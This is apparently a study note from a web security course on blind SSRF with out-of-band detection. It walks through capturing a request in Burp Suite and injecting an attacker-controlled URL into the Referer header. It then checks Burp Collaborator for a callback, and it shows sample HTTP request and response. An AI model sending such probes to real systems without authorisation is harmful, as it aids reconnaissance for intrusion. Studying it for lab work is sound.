---
course: Web Security
topic: Server-Side Request Forgery (SSRF)
tags: [web-security]
---

## Testing for SSRF Vulnerabilities

When testing for SSRF vulnerabilities, it is crucial to examine every parameter that could potentially invoke a URL. This includes form fields, query parameters, and headers.

### Referral Header Example

In this lab, we are dealing with a referral header that is used by some analytic software to track user visits. The referral header is taken as input and processed by the server. To test for SSRF, we need to inject a malicious URL into the referral header and observe the behavior of the server.

#### Step-by-Step Process

1. **Capture the Request**: Use Burp Suite to capture the HTTP request containing the referral header.
2. **Modify the Request**: Inject a malicious URL into the referral header.
3. **Send the Modified Request**: Use the Repeater tool to send the modified request to the server.
4. **Monitor Burp Collaborator**: Check the Burp Collaborator interface to see if the server made a request to the attacker-controlled domain.

### Example HTTP Request

Here is an example of an HTTP request with a referral header:

```http
GET /page HTTP/1.1
Host: targetserver.com
Referer: http://attacker-controlled-domain.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: close
```

### Example HTTP Response

The server might not return a response to the attacker, but we can monitor the Burp Collaborator interface to confirm if the server made a request to the attacker-controlled domain.

```http
HTTP/1.1 200 OK
Date: Mon, 24 Jan 2022 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Content-Length: 1234
Connection: close
```

---
<!-- nav -->
[[Web Security (PortSwigger)/09-Server-Side Request Forgery (SSRF)/07-Lab 6 Blind SSRF with out of band detection/07-Real-World Examples|Real-World Examples]] | [[Web Security (PortSwigger)/09-Server-Side Request Forgery (SSRF)/07-Lab 6 Blind SSRF with out of band detection/00-Overview|Overview]] | [[09-Understanding the Lab Exercise|Understanding the Lab Exercise]]
